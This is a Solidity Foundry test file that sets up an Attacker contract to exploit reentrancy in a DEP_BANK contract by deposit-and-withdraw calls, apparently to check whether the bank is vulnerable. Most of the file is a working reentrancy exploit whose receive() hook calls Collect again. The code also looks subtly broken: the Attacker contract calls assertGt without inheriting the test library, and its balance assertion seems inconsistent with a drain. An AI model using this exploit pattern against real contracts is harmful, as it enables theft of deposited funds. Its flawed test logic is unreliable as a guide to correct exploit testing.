
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    DEP_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialBalance;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialBalance = victim.balances(address(this));
        victim.Collect(val);
        assertGt(victim.balances(address(this)), initialBalance, "Reentrancy attack failed: balance not increased");
        exploitSucceeded = true;
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect(attackValue);
            attackCallCount++;
        }
    }
}
